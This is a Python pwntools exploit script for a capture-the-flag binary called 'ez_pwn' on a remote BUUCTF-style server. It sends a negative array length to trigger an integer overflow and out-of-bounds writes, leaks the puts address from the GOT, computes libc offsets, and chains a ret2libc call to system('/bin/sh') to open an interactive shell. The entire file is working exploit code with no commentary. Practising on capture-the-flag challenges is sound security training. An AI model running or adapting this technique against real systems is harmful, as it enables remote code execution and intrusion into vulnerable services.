from pwn import *
context.arch = 'i386'
context.os = 'linux'
context.log_level = 'DEBUG'


# sh = process(['./ez_pwn'])
sh = remote('node4.buuoj.cn', 28293)
elf = ELF('./ez_pwn')


def pwn():
    sh.recvuntil(b"length of array:")
    sh.sendline(b"-2147483648")

    for _ in range(10):
        sh.sendlineafter(b"input your choice:", b'1')
        sh.sendlineafter(b"input num", b'1')

    sh.sendlineafter(b"input your choice:", b'1')  # v2
    sh.sendlineafter(b"input num", b'1000')

    sh.sendlineafter(b"input your choice:", b'1')  # v3
    sh.sendlineafter(b"input num", b'1')

    sh.sendlineafter(b"input your choice:", b'1')  # v4
    sh.sendlineafter(b"input num", b'17')


puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
hackme_addr = 0x8049216


pwn()

sh.sendlineafter(b"input your choice:", b'1')
sh.sendlineafter(b"input num", str(puts_plt).encode())
sh.sendlineafter(b"input your choice:", b'1')
sh.sendlineafter(b"input num", str(hackme_addr).encode())
sh.sendlineafter(b"input your choice:", b'1')
sh.sendlineafter(b"input num", str(puts_got).encode())
sh.sendlineafter(b"input your choice:", b'4')
sh.recvuntil(b"exit!\n")

puts_addr = u32(sh.recv(4).ljust(4, b'\x00'))
libc_base = puts_addr - 0x67560
system_addr = libc_base + 0x3cf10
bin_sh_addr = libc_base + 0x17b9db


pwn()
print(">>>>> system_addr", hex(system_addr), system_addr)
print(">>>>> binsh_addr", hex(bin_sh_addr), bin_sh_addr)
print(">>>>> puts_addr", hex(puts_addr))
print(">>>>> libc_addr", hex(libc_base))

sh.sendlineafter(b"input your choice:", b'1')
sh.sendlineafter(b"input num", str(signed(system_addr)).encode())
sh.sendlineafter(b"input your choice:", b'1')
sh.sendlineafter(b"input num", str(hackme_addr).encode())
sh.sendlineafter(b"input your choice:", b'1')
sh.sendlineafter(b"input num", str(signed(bin_sh_addr)).encode())
sh.sendlineafter(b"input your choice:", b'4')

sh.interactive()

